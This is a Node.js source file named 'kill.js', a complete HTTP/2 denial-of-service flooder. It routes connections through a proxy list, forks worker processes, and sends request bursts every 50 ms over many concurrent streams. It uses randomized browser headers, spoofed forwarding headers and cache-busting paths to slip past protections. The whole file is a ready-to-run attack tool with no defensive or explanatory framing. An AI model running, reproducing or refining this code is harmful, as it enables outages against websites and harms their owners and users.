const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});

if (process.argv.length < 7) {
    console.log(`Usage: node kill.js <target> <time> <rate> <threads> <proxyfile>`);
    process.exit(1);
}

const headers = {};

function readLines(filePath) {
    if (!fs.existsSync(filePath)) {
        console.error(`File ${filePath} not found`);
        process.exit(1);
    }
    const lines = fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() !== "");
    if (lines.length === 0) {
        console.error(`Proxy file ${filePath} is empty`);
        process.exit(1);
    }
    return lines;
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const parsedTarget = url.parse(args.target);
if (!parsedTarget.protocol || !parsedTarget.host) {
    console.error('Invalid target URL');
    process.exit(1);
}

const sig = ['ecdsa_secp256r1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512', 'ecdsa_secp384r1_sha384'];
const accept_header = ['*/*', 'text/html', 'application/json', 'application/xml', 'text/plain'];
const lang_header = ['en-US', 'vi-VN', 'zh-CN', 'fr-FR', 'de-DE', 'ja-JP'];
const encoding_header = ['gzip, deflate, br', 'deflate', 'gzip', 'br', 'identity'];
const version = ['"Google Chrome";v="113"', '"Microsoft Edge";v="113"', '"Firefox";v="91"', '"Safari";v="16"', '"Chromium";v="113"'];
const platform = ['Windows', 'Macintosh', 'Linux', 'iPhone', 'iPad'];
const rateHeaders = [
    { "akamai-origin-hop": randstr(12) },
    { "via": randstr(12) },
    { "x-forwarded-for": randstr(12) },
    { "client-ip": randstr(12) },
    { "referer": `https://${parsedTarget.host}/${randstr(8)}` }
];

const proxies = readLines(args.proxyFile);

if (cluster.isMaster) {
    console.clear();
    console.log(`Target: ${parsedTarget.host}`);
    console.log(`Duration: ${args.time}`);
    console.log(`Threads: ${args.threads}`);
    console.log(`RPS: ${args.Rate}`);
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    setTimeout(() => process.exit(0), args.time * 1000);
} else {
    setInterval(runFlooder, 50); // Reduced interval for faster retries
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 60000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, `error: invalid response from proxy ${options.host}:${options.port}`);
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, `error: timeout exceeded for ${options.host}:${options.port}`);
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, `error: ${error.message} for ${options.host}:${options.port}`);
        });
    }
}

const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + "?" + randstr(10) + "=" + randstr(5);
headers[":scheme"] = "https";
headers["sec-ch-ua"] = randomElement(version);
headers["sec-ch-ua-platform"] = randomElement(platform);
headers["accept-encoding"] = randomElement(encoding_header);
headers["accept-language"] = randomElement(lang_header);
headers["accept"] = randomElement(accept_header);
headers["user-agent"] = `Mozilla/5.0 (${randomElement(platform)} ${randomIntn(10, 12)}.0; ${randomElement(['Win64; x64', 'MacIntel', 'Linux'])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36`;
headers["cache-control"] = "no-cache";
headers["pragma"] = "no-cache";

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    if (!parsedProxy[0] || !parsedProxy[1]) {
        console.error(`Invalid proxy format: ${proxyAddr}`);
        return setTimeout(runFlooder, 500);
    }

    const proxyOptions = {
        host: parsedProxy[0],
        port: parseInt(parsedProxy[1]),
        address: parsedTarget.host + ":443",
        timeout: 3 // Reduced timeout for faster retries
    };

    let retryCount = 0;
    const maxRetries = 3; // Reduced retries to avoid hanging

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            if (connection) connection.destroy();
            if (retryCount < maxRetries) {
                retryCount++;
                console.error(`Retrying (${retryCount}/${maxRetries}) for ${proxyAddr}: ${error}`);
                setTimeout(runFlooder, 500);
            }
            return;
        }

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2', 'http/1.1'],
            ciphers: 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256',
            ecdhCurve: 'auto',
            host: parsedTarget.host,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            sigalgs: randomElement(sig)
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 5000, // Increased for more concurrent requests
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            createConnection: () => tlsConn
        });

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                const dynHeaders = {
                    ...headers,
                    ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
                    "sec-fetch-site": randomElement(["none", "same-origin", "same-site", "cross-site"]),
                    "sec-fetch-mode": randomElement(["navigate", "same-origin", "no-cors"]),
                    "sec-fetch-dest": randomElement(["document", "empty", "iframe"])
                };
                for (let i = 0; i < args.Rate * 2; i++) { // Doubled request rate
                    const request = client.request(dynHeaders);
                    request.on("response", () => {
                        request.close();
                        request.destroy();
                    });
                    request.on("error", () => {
                        request.close();
                        request.destroy();
                    });
                    request.end();
                }
            }, 50); // Reduced interval for faster request bursts
            setTimeout(() => {
                clearInterval(IntervalAttack);
                client.destroy();
                tlsConn.destroy();
                connection.destroy();
            }, args.time * 1000);
        });

        client.on("error", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
            setTimeout(runFlooder, 500);
        });

        client.on("close", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
            setTimeout(runFlooder, 500);
        });
    });
}
